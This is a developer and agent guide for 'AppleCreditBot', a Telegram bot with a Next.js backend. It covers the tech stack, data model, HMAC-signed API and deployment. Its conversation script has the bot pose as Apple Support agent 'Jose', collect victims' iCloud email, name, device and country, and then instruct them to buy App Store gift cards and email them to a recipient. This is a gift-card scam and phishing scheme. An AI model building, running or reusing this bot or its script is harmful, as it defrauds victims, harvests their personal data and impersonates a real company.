AppleCreditBot • Agent Guide

Purpose
- Build a Telegram bot that collects user inputs and displays them on a web page.
- Use a Next.js app to both store and serve submitted data (Next.js as the “database” via file-backed storage during development; swappable to SQLite/Prisma later).

Scope
- This file governs the entire repository. Follow these conventions for any file you touch here.

Tech Stack
- Runtime: Bun 1.1+ (Node.js compatibility APIs enabled by default)
- Web: Next.js 14+ (App Router), TypeScript, server actions/route handlers.
- Bot: TypeScript, grammY (preferred on Bun) or Telegraf if needed. Webhook-first integration.
- Storage (dev): In-memory via core DAL (ephemeral). Optional upgrade path: Prisma + SQLite/Postgres.
- Package manager: bun (use `bun install`, `bun run`, `bunx`).

Repository Structure
- apps/
  - web/  (Next.js app for API + UI)
  - bot/  (Telegram bot, webhook handler)
- packages/
  - core/
    - dal/
      - order/
        - index.ts   (DAL implementation and interfaces)
        - order.sql  (SQL schema for orders)
    - libs/
       - environment.ts (env var handling)
    - types.ts (shared domain types)
    - validation.ts (Zod schemas)
- .env*  (environment variables, not committed)

Environment & Tooling
- Bun: v1.1+.
- TypeScript: strict mode enabled.
- Linting/formatting: ESLint + Prettier. Match existing config if present.
- Commits: Conventional Commits (e.g., `feat: add submission endpoint`).

“Next.js as Database” Strategy
- Keep all domain logic in `packages/core`. Define SQL schema in `dal/order/order.sql` and expose a DAL in `dal/order/index.ts` that the Next.js route handlers call.
- Development: default to SQLite (in-memory is acceptable); the DAL can accept a connection string/provider to enable persistence without changing callers.
- Production: swap to a managed SQLite/Postgres provider using the same DAL interface.

Data Model (orders)
- Order:
  - id: string (ULID/UUID)
  - telegramChatId: number
  - telegramUserId: number
  - telegramUsername?: string
  - firstName?: string
  - lastName?: string
  - device: 'iPhone' | 'iPad' | 'Mac' | 'Other'
  - country: string
  - icloudEmail: string
  - fullName: string (first + last as provided)
  - consentGroupInvite: boolean
  - status: 'new' | 'in_review' | 'approved' | 'rejected'
  - createdAt: string
  - updatedAt: string
  - meta?: Record<string, unknown>

HTTP API (Next.js, under `apps/web`)
- POST `/api/orders` → create order (HMAC-signed by bot). Uses core validation + DAL.
- GET `/api/orders` → list orders (server-rendered page uses this internally); protect for public output as needed.
- Optional: PATCH `/api/orders/:id` → moderate/update status (admin only)

Security
- Bot → Web authentication: Include `X-Bot-Signature` as HMAC-SHA256 of the raw JSON body using `BOT_WEBHOOK_SECRET`. Verification lives in `packages/core/security/signature.ts` and is used by web API route handlers.
- Header: `X-Bot-Signature: sha256=<hex>`; payload: raw body bytes. Clock skew irrelevant; no timestamp required for now; can add `X-Bot-Timestamp` later.
- Rate limit write endpoints (IP + bot identity). Avoid logging PII in prod logs.
- Validate all inputs with Zod. Normalize emails and trim strings.

Telegram Bot (under `apps/bot`)
- Library: grammY (preferred for Bun). Implement as webhook handler; avoid long polling in production.
- Config: `TELEGRAM_BOT_TOKEN`, `WEB_BASE_URL`, `BOT_WEBHOOK_SECRET`.
- Use `packages/core/http/client.ts` to submit to `/api/orders` with signature automatically.
- Store chat state in memory or lightweight store (e.g., `Map` or Redis if needed later). Keep state minimal; persist only final order to web API.

Conversation Flow (script)
- Greeting
  - "Thanks for contacting Apple Support. Please give me a moment to look over the information you have provided."
  - Agent self-intro: "This is Jose and I will be your support today <UserFirstName>. Got you cannot make purchases."

- User prompt: Ask device used
  - "In order to start, may I know which device are you using to contact us? I mean is it an iPhone, iPad or Mac? Or any other device (which one)."
  - Capture: device

- Ask country
  - "In order to proceed, may I know the country where you are?"
  - Capture: country

- Ask iCloud email
  - "Your iCloud email address?"
  - Capture: icloudEmail

- Ask first and last name
  - "First name and last name?"
  - Capture: name

- Acknowledge + short hold
  - "Thanks. Be right back. A notification would be sent to you, click ‘Confirm’."

- 24-hour process message
  - "Alright <UserFirstName>, I have created a 24 hours process which means the issue should be solved in 24 hours. Please don't try to make other purchases since it might interrupt or cancel the process I've created. If the issue persists, please write us back to escalate again."

- Check clarity
  - "Is the path to follow clear? Or is there any other information I can help you with from here?"

- Group invitation
  - "Would you like to be added to a group where we share opportunities on how to earn profits from making purchases on Apple Store?"
  - Capture: consentGroupInvite = Yes/No

- Purchase instructions (send on request or after consent)
  - "How to make purchases:\nOpen App Store → Click your profile (top right) →\nClick ‘Send Gift Card by Email’ →\nFill ‘To:’ with recipient email →\nAdd price in ‘Other’ →\nClick Next → Select theme →\nClick ‘Buy’ (top right) → Proceed ‘Buy Now’."

Web UI (under `apps/web`)
- Pages:
  - Public/secured list view of orders (basic table with search/filter by status, date, country).
  - Optional detail view for an order.
- Server-rendered (App Router). Avoid exposing raw PII in SEO. Consider basic auth for early phases.

Developer Commands (suggested)
- Install deps (root): `bun install`
- Core build/test: `cd packages/core && bun test`
- Web dev: `cd apps/web && bun dev` (or `bunx next dev`)
- Bot dev: `cd apps/bot && bun dev`
- Type check: `bun run typecheck`
- Lint: `bun run lint`
- Test (root): `bun test`

Coding Conventions
- Keep changes minimal and focused. Prefer small, composable modules.
- No license headers unless requested. No one-letter variable names.
- Use async/await, never swallow errors; return typed Results where helpful.
- Validate inputs at the boundary; never trust the client/bot payload.
- Place shared utilities in `packages/core` (types, zod schemas, signatures, fetch client) for reuse.

Testing
- Unit: Vitest/Jest for shared and API logic.
- E2E (optional later): Playwright for web UI.
- Include sample fixtures inline in tests or `__fixtures__` within packages.

Deployment Notes
- Web (Next.js): Vercel or a Node-compatible host. Bun is supported for building/running where available; alternatively run Next.js with Node compatibility via Bun runtime. Set env vars `BOT_WEBHOOK_SECRET`, `NEXT_PUBLIC_SITE_URL`.
- Bot: Deploy to a Bun-supported runtime (Fly.io/Render/Deno Deploy with compatibility where applicable). Set webhook to `https://<site>/api/bot/webhook` or a dedicated bot endpoint.

Agent Working Rules (for future automation)
- Use `apply_patch` for edits; avoid unnecessary churn.
- Read files in ≤250 line chunks. Prefer `rg` to search.
- Don’t add tools or reformat the repo globally without clear need.
- If adding tests or scripts to validate work, remove any temporary scaffolding before handoff unless requested.
